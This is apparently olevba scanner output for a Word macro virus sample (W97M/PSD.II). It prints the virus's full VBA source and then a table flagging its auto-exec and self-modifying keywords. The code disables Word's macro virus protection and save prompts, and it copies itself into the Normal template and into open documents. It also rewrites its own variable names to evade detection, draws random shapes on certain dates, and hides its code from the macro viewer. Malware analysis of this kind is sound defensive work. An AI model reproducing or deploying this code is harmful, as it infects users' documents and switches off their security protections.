olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-dbe8495ebb5b215157149f3c1197905a56527173
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-dbe8495ebb5b215157149f3c1197905a56527173 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For VF3493 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next VF3493: End If
SR1294 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OU1491 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH7991 = ActiveDocument.VBProject.VBComponents.Item(1)
VM5959 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH7991 = NormalTemplate.VBProject.VBComponents.Item(1)
OB1635 = True
Call CV1281_IF3159
ActiveDocument.Saved = True
End If
If OB1635 <> True And VM5959 <> True Then GoTo TR621
If OB1635 = True Then AH7991.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SR1294 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If VM5959 = True Then AH7991.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OU1491 - 4))
TR621:
If OU1491 <> 0 And SR1294 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function CV1281_IF3159()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "MN2363": r1(2) = "GR521": r1(3) = "PE9550": r1(4) = "BM704": r1(5) = "IF3159": r1(6) = "SR1294"
r1(7) = "OU1491": r1(8) = "VM5959":: r1(9) = "AH7991": r1(10) = "OB1635": r1(11) = "TR621": r1(12) = "CV1281": r1(13) = "VN508": r1(14) = "ED5525": r1(15) = "VF3493"
For VF3493 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call IF3159(a1, r1(VF3493))
Next VF3493
End Function 'VAMP v1.0 [thanks Vic!]
Private Function IF3159(ED5525, VN508 As String)
On Error Resume Next
Dim MN2363 As Long: Dim GR521 As Long: Dim PE9550 As Long: Dim BM704 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MN2363 = 1: GR521 = 1: PE9550 = .CountOfLines: BM704 = Len(.Lines(.CountOfLines, 1))
Do While .Find(VN508, MN2363, GR521, PE9550, BM704, True)
strline = .Lines(MN2363, 1)
strline = Left(strline, GR521 - 1) & ED5525 & Mid(strline, BM704)
.replaceline MN2363, strline
MN2363 = PE9550 + 1: GR521 = 1:
PE9550 = .CountOfLines
BM704 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

